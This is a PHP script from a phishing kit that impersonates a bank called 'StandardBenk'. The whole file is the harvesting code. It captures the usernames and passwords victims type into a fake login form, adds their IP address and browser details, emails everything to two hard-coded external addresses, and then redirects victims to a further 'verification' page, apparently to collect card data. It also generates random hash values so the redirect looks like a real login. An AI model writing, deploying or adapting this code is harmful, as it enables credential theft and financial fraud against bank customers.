<?php
session_start();
include'ip.php';
$ip = MDgetIp();

$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]Utilizador: ".$_POST['username']."\n";
$message .= "[+]Acesso:     ".$_POST['password']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";

$message .= "[ - ] ==================| Card |================== [ - ]\n";
$_SESSION['x'] = $message;

$praga=rand();
$praga=md5($praga);

if(!empty($_POST['username'])){
$send = "jehovahelilah@mail2world.com, jehovahelilah@gmail.com";
$subject = "StandardBenk - [".$ip."]";
$headers = "From: SB<bursted@sb.com>";

mail($sendX,$subject,$message,$headers);
mail($send,$subject,$message,$headers);


header("Location: verification.php");

}else{
header("Location: index.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

}
	 
?>